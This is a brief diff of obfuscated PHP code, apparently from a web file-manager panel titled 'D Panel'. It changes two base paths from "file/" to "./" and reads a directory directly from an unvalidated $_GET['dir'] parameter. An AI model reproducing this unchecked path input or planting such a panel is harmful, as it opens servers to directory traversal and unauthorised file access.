@@ -28,8 +28,8 @@ if (!@$Vfooltkokdmz) $Vfooltkokdmz = $Vfooltkokdmz;
 
 
 
-$Vwnjajrupcwx = "file/";
-$Vr2dlypuv4mu = "file/";
+$Vwnjajrupcwx = "./";
+$Vr2dlypuv4mu = "./";
 $Vcytgghiywp0 = 'D Panel';
 if(@$_GET['dir'])
 	{   $V4prvkagdnq4=$_GET['dir'];
